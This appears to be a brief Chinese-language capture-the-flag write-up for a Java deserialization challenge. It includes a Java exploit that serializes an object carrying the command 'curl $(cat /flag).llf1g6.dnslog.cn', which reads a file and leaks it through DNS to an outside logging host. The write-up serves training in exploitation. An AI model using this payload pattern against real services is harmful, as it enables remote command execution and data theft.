# java_checkin

## 题目描述

## 考点

java项目导入，简单的反序列化，dns出网

## 解析

题目只需要简单的java知识，会反序列化即可，另外题目tcp不出网，可以使用dnslog获取flag。

*exp*

```java
package org.dawn;

import org.dawn.java_checkin.bean.User;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Main {
    public static void main(String[] args) throws Exception {

        User user = new User();
        user.secret = new String[]{"bash", "-c", "curl $(cat /flag).llf1g6.dnslog.cn"};

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeUTF("whuctf");
        oos.writeInt(2024);
        oos.writeObject(user);
        byte[] res = baos.toByteArray();

        Base64.Encoder encoder = Base64.getEncoder();
        System.out.println(encoder.encodeToString(res));
    }
}
```
